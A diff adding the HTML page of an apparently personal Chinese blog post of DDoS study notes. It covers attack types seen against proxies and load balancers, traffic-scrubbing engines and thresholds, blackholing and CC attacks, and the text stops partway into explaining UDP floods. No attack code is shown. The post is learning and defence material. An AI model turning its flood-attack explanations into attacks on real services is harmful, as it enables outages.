@@ -1,0 +1,641 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前置学习类型举例 针对 Proxy 发起的 NTP 反射攻击 针对 透明代理的 RST Fin 针对 ttgw&#x2F;tlb 的一起 NTP 反射 针对 ttgw dcdn IP的UdpFlood ReflectFlood InvalidFlood DNSFlood 攻击 OCIC，DNS flood 包含 SynFlood UdpFlood ReflectFlood SynAckFlood">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DDOS学习">
+<meta property="og:url" content="http://p5ych2022.github.io/2025/02/27/DDOS%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="psych&#39;s blog">
+<meta property="og:description" content="前置学习类型举例 针对 Proxy 发起的 NTP 反射攻击 针对 透明代理的 RST Fin 针对 ttgw&#x2F;tlb 的一起 NTP 反射 针对 ttgw dcdn IP的UdpFlood ReflectFlood InvalidFlood DNSFlood 攻击 OCIC，DNS flood 包含 SynFlood UdpFlood ReflectFlood SynAckFlood">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-02-27T12:30:24.000Z">
+<meta property="article:modified_time" content="2025-02-27T12:31:47.641Z">
+<meta property="article:author" content="psych">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="ddos">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>DDOS学习</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="psych&#39;s blog" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Article</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/01/05/2024%E5%B9%B4%E5%BA%A6/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://p5ych2022.github.io/2025/02/27/DDOS%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://p5ych2022.github.io/2025/02/27/DDOS%E5%AD%A6%E4%B9%A0/&text=DDOS学习"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://p5ych2022.github.io/2025/02/27/DDOS%E5%AD%A6%E4%B9%A0/&title=DDOS学习"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://p5ych2022.github.io/2025/02/27/DDOS%E5%AD%A6%E4%B9%A0/&is_video=false&description=DDOS学习"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=DDOS学习&body=Check out this article: http://p5ych2022.github.io/2025/02/27/DDOS%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://p5ych2022.github.io/2025/02/27/DDOS%E5%AD%A6%E4%B9%A0/&title=DDOS学习"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://p5ych2022.github.io/2025/02/27/DDOS%E5%AD%A6%E4%B9%A0/&title=DDOS学习"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://p5ych2022.github.io/2025/02/27/DDOS%E5%AD%A6%E4%B9%A0/&title=DDOS学习"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://p5ych2022.github.io/2025/02/27/DDOS%E5%AD%A6%E4%B9%A0/&title=DDOS学习"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://p5ych2022.github.io/2025/02/27/DDOS%E5%AD%A6%E4%B9%A0/&name=DDOS学习&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://p5ych2022.github.io/2025/02/27/DDOS%E5%AD%A6%E4%B9%A0/&t=DDOS学习"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.</span> <span class="toc-text">前置学习</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B1%BB%E5%9E%8B%E4%B8%BE%E4%BE%8B"><span class="toc-number">1.0.1.</span> <span class="toc-text">类型举例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E6%B8%85%E6%B4%97"><span class="toc-number">1.0.2.</span> <span class="toc-text">流量清洗</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%91%E6%B4%9E"><span class="toc-number">1.0.3.</span> <span class="toc-text">黑洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CC-%E6%94%BB%E5%87%BB"><span class="toc-number">1.0.4.</span> <span class="toc-text">CC 攻击</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DDoS-%E6%94%BB%E5%87%BB%E5%88%86%E7%B1%BB"><span class="toc-number">2.</span> <span class="toc-text">DDoS 攻击分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E7%BD%91%E7%BB%9C%E5%B8%A6%E5%AE%BD%E8%B5%84%E6%BA%90"><span class="toc-number">2.1.</span> <span class="toc-text">攻击网络带宽资源</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E6%94%BB%E5%87%BB"><span class="toc-number">2.1.1.</span> <span class="toc-text">直接攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#UDP-Flood"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">UDP Flood</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.1.1.1.</span> <span class="toc-text">攻击原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.1.1.1.2.</span> <span class="toc-text">代码示例</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%88%86%E7%B1%BB"><span class="toc-number">2.1.1.1.3.</span> <span class="toc-text">攻击分类</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ICMP-Flood"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">ICMP Flood</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86-1"><span class="toc-number">2.1.1.2.1.</span> <span class="toc-text">攻击原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B-1"><span class="toc-number">2.1.1.2.2.</span> <span class="toc-text">代码示例</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#IGMP-Flood"><span class="toc-number">2.1.1.3.</span> <span class="toc-text">IGMP Flood</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86-2"><span class="toc-number">2.1.1.3.1.</span> <span class="toc-text">攻击原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B-2"><span class="toc-number">2.1.1.3.2.</span> <span class="toc-text">代码示例</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%86%E7%B1%BB"><span class="toc-number">2.1.1.3.3.</span> <span class="toc-text">分类</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%92%8C%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB"><span class="toc-number">2.1.2.</span> <span class="toc-text">反射和放大攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ACK-%E5%8F%8D%E5%B0%84%E6%94%BB%E5%87%BB"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">ACK 反射攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.2.1.1.</span> <span class="toc-text">前置原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B-3"><span class="toc-number">2.1.2.1.2.</span> <span class="toc-text">代码示例</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%96%B9%E5%BC%8F"><span class="toc-number">2.1.2.1.3.</span> <span class="toc-text">防护方式</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DNS%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB"><span class="toc-number">2.1.2.2.</span> <span class="toc-text">DNS放大攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E5%8E%9F%E7%90%86-1"><span class="toc-number">2.1.2.2.1.</span> <span class="toc-text">前置原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B-4"><span class="toc-number">2.1.2.2.2.</span> <span class="toc-text">代码示例</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%96%B9%E5%BC%8F-1"><span class="toc-number">2.1.2.2.3.</span> <span class="toc-text">防护方式</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#NTP%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB"><span class="toc-number">2.1.2.3.</span> <span class="toc-text">NTP放大攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E5%8E%9F%E7%90%86-2"><span class="toc-number">2.1.2.3.1.</span> <span class="toc-text">前置原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.1.2.3.2.</span> <span class="toc-text">攻击示例</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%96%B9%E5%BC%8F-2"><span class="toc-number">2.1.2.3.3.</span> <span class="toc-text">防护方式</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SNMP%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB"><span class="toc-number">2.1.2.4.</span> <span class="toc-text">SNMP放大攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#SNMP-%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.1.2.4.1.</span> <span class="toc-text">SNMP 放大攻击步骤</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B-5"><span class="toc-number">2.1.2.4.2.</span> <span class="toc-text">代码示例</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%96%B9%E5%BC%8F-3"><span class="toc-number">2.1.2.4.3.</span> <span class="toc-text">防护方式</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E7%B3%BB%E7%BB%9F%E8%B5%84%E6%BA%90"><span class="toc-number">2.2.</span> <span class="toc-text">攻击系统资源</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB-TCP-%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.2.1.</span> <span class="toc-text">攻击 TCP 连接</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SYN-Flood-%E8%BF%9E%E6%8E%A5%E5%BB%BA%E7%AB%8B"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">SYN Flood - 连接建立</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AE%E5%8E%9F%E7%90%86"><span class="toc-number">2.2.1.1.1.</span> <span class="toc-text">协议原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86-3"><span class="toc-number">2.2.1.1.2.</span> <span class="toc-text">攻击原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B-6"><span class="toc-number">2.2.1.1.3.</span> <span class="toc-text">代码示例</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%96%B9%E5%BC%8F-4"><span class="toc-number">2.2.1.1.4.</span> <span class="toc-text">防护方式</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PSH-ACK-Flood-%E6%95%B0%E6%8D%AE%E4%BC%A0%E9%80%81"><span class="toc-number">2.2.1.2.</span> <span class="toc-text">PSH + ACK Flood - 数据传送</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AE%E5%8E%9F%E7%90%86-1"><span class="toc-number">2.2.1.2.1.</span> <span class="toc-text">协议原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B-7"><span class="toc-number">2.2.1.2.2.</span> <span class="toc-text">代码示例</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%96%B9%E5%BC%8F-5"><span class="toc-number">2.2.1.2.3.</span> <span class="toc-text">防护方式</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RST%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB-%E8%BF%9E%E6%8E%A5%E4%B8%AD%E6%AD%A2"><span class="toc-number">2.2.1.3.</span> <span class="toc-text">RST洪水攻击 - 连接中止</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AE%E5%8E%9F%E7%90%86-2"><span class="toc-number">2.2.1.3.1.</span> <span class="toc-text">协议原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86-4"><span class="toc-number">2.2.1.3.2.</span> <span class="toc-text">攻击原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B-8"><span class="toc-number">2.2.1.3.3.</span> <span class="toc-text">代码示例</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%96%B9%E5%BC%8F-6"><span class="toc-number">2.2.1.3.4.</span> <span class="toc-text">防护方式</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Sockstress%E6%85%A2%E9%80%9F%E6%94%BB%E5%87%BB%EF%BC%88Sockstress-Slowloris-Attack%EF%BC%89"><span class="toc-number">2.2.1.4.</span> <span class="toc-text">Sockstress慢速攻击（Sockstress Slowloris Attack）</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AE%E5%8E%9F%E7%90%86-3"><span class="toc-number">2.2.1.4.1.</span> <span class="toc-text">协议原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86-5"><span class="toc-number">2.2.1.4.2.</span> <span class="toc-text">攻击原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B-9"><span class="toc-number">2.2.1.4.3.</span> <span class="toc-text">代码示例</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%96%B9%E5%BC%8F-7"><span class="toc-number">2.2.1.4.4.</span> <span class="toc-text">防护方式</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB-SSL-%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.2.2.</span> <span class="toc-text">攻击 SSL 连接</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#THC-SSL-Dos%E6%85%A2%E9%80%9F%E6%94%BB%E5%87%BB"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">THC SSL Dos慢速攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.2.2.1.1.</span> <span class="toc-text">攻击步骤</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B-10"><span class="toc-number">2.2.2.1.2.</span> <span class="toc-text">代码示例</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%96%B9%E5%BC%8F-8"><span class="toc-number">2.2.2.1.3.</span> <span class="toc-text">防护方式</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SSL-Flood"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">SSL Flood</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86-6"><span class="toc-number">2.2.2.2.1.</span> <span class="toc-text">攻击原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4-1"><span class="toc-number">2.2.2.2.2.</span> <span class="toc-text">攻击步骤</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B-11"><span class="toc-number">2.2.2.2.3.</span> <span class="toc-text">代码示例</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB-Web%E8%B5%84%E6%BA%90"><span class="toc-number">2.3.</span> <span class="toc-text">攻击 Web资源</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#HTTP-%E6%85%A2%E9%80%9F%E6%94%BB%E5%87%BB"><span class="toc-number">2.3.1.</span> <span class="toc-text">HTTP 慢速攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%86%E7%B1%BB-1"><span class="toc-number">2.3.1.1.</span> <span class="toc-text">分类</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E8%BF%87%E7%A8%8B%E6%94%BB%E5%87%BB"><span class="toc-number">2.3.2.</span> <span class="toc-text">数据处理过程攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB"><span class="toc-number">2.3.2.1.</span> <span class="toc-text">正则表达式拒绝服务攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%96%B9%E5%BC%8F-9"><span class="toc-number">2.3.2.1.1.</span> <span class="toc-text">防护方式</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E5%86%B2%E7%AA%81%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%EF%BC%88Hash-DoS%EF%BC%89"><span class="toc-number">2.3.2.2.</span> <span class="toc-text">哈希冲突拒绝服务攻击（Hash DoS）</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B-12"><span class="toc-number">2.3.2.2.1.</span> <span class="toc-text">代码示例</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DDoS-%E6%B2%BB%E7%90%86"><span class="toc-number">3.</span> <span class="toc-text">DDoS 治理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">3.0.1.</span> <span class="toc-text">绕过方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F"><span class="toc-number">3.0.2.</span> <span class="toc-text">防御方式</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        DDOS学习
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">psych</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-02-27T12:30:24.000Z" class="dt-published" itemprop="datePublished">2025-02-27</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/web/">web</a> › <a class="category-link" href="/categories/web/web%E5%9F%BA%E7%A1%80/">web基础</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/ddos/" rel="tag">ddos</a>, <a class="p-category" href="/tags/web/" rel="tag">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="前置学习"><a href="#前置学习" class="headerlink" title="前置学习"></a>前置学习</h2><h4 id="类型举例"><a href="#类型举例" class="headerlink" title="类型举例"></a>类型举例</h4><ul>
+<li>针对 Proxy 发起的 NTP 反射攻击</li>
+<li>针对 透明代理的 RST Fin</li>
+<li>针对 ttgw&#x2F;tlb 的一起 NTP 反射</li>
+<li>针对 ttgw dcdn IP的UdpFlood ReflectFlood InvalidFlood DNSFlood 攻击</li>
+<li>OCIC，DNS flood</li>
+<li>包含 SynFlood UdpFlood ReflectFlood SynAckFlood InvalidFlood DNSFlood SynIllegalFlood</li>
+<li>NTP 反射攻击</li>
+<li>视频投稿类误报</li>
+<li>UdpFlood</li>
+<li>SYN 端口扫描</li>
+<li>ReflectFlood</li>
+<li>frontier_aweme_lb_v3 ICMP FLOOD 和 RST flood</li>
+</ul>
+<h4 id="流量清洗"><a href="#流量清洗" class="headerlink" title="流量清洗"></a>流量清洗</h4><ul>
+<li><p><strong>清洗条件</strong></p>
+<p>当流入WAF的流量满足流量模型特征，且达到设置的清洗阈值时，会触发流量清洗。</p>
+<p>如以下三层净化引擎：</p>
+<ul>
+<li><strong>流量分类引擎</strong>：通过 NetFlow&#x2F;sFlow 协议进行实时流量采样，运用熵值分析法检测流量突变。对 SYN Flood 识别采用<strong>SYN Cookie 验证</strong>，对 DNS 反射攻击采用<strong>DNS 查询合法性验证</strong></li>
+<li><strong>协议合规过滤</strong>：建立 TCP 状态机跟踪机制，丢弃不符合 RFC 标准的畸形报文（如 ACK Flood 中违反序列号规则的包）。针对 HTTP Flood 实施<strong>HTTP 协议指纹识别</strong>，过滤非常规 User-Agent</li>
+<li><strong>行为特征过滤</strong>：基于 IP 信誉库（如 Spamhaus DDoS 列表）进行源头拦截，对高频请求 IP 实施动态速率限制（Rate Limiting）。采用机器学习模型分析请求间隔时间、报文大小分布等 27 维特征</li>
+</ul>
+</li>
+<li><p><strong>清洗阈值</strong></p>
+<p>流量清洗的方法包括过滤攻击报文、限制流量速度、限制数据包速度等。所以，在使用DDoS基础防护时，您需要设置以下阈值：</p>
+<ul>
+<li>BPS（Bits per Second，数据传输速率）清洗阈值：当入方向流量超过BPS清洗阈值时，会触发流量清洗。</li>
+<li>PPS（Packet per Second，数据包收发速率）清洗阈值：当入方向数据包数超过PPS清洗阈值时，会触发流量清洗。</li>
+</ul>
+</li>
+</ul>
+<h4 id="黑洞"><a href="#黑洞" class="headerlink" title="黑洞"></a>黑洞</h4><p>当流入WAF的峰值带宽（清洗后的流量带宽、没有DDoS攻击行为的流量带宽）超过DDoS基础防护阈值，WAF将进入黑洞。进入黑洞后，所有访问WAF的流量（包括正常请求和攻击请求）都会被丢弃。</p>
+<p>DDoS防御能力越大，黑洞阈值就越大，WAF被DDoS攻击导致触发黑洞的可能就越低。</p>
+<h4 id="CC-攻击"><a href="#CC-攻击" class="headerlink" title="CC 攻击"></a>CC 攻击</h4><p>大流量的DDoS攻击主要是针对IP的<strong>四层攻击</strong>，而CC攻击是针对<strong>七层应用的攻击</strong>（例如HTTP GET&#x2F;POST Flood）。WAF可以防御CC攻击，但对于大流量的DDoS攻击，由于需要通过足够大的带宽资源把所有流量都硬抗下来再进行清洗，只能通过DDoS防护服务来防护。</p>
+<hr>
+<h2 id="DDoS-攻击分类"><a href="#DDoS-攻击分类" class="headerlink" title="DDoS 攻击分类"></a>DDoS 攻击分类</h2><h3 id="攻击网络带宽资源"><a href="#攻击网络带宽资源" class="headerlink" title="攻击网络带宽资源"></a>攻击网络带宽资源</h3><h4 id="直接攻击"><a href="#直接攻击" class="headerlink" title="直接攻击"></a>直接攻击</h4><p>相比反射和放大攻击来说低效率，且容易被查到攻击源头。</p>
+<h5 id="UDP-Flood"><a href="#UDP-Flood" class="headerlink" title="UDP Flood"></a><strong>UDP Flood</strong></h5><blockquote>
+<p>通过泛海量发送 UDP 数据包，目标发生大量数据包请求，从而导致网络拥塞。</p>
+</blockquote>
+<h6 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h6><ul>
+<li><strong>UDP 协议特点</strong>：UDP（User Datagram Protocol）是一种无连接协议，它不同于 TCP，UDP 在发送数据时不进行三次握手，也不保证数据的可靠性。由于UDP不需要建立连接，因此它比 TCP更适合快速发送大量数据，这也为攻击者提供了可利用的漏洞。</li>
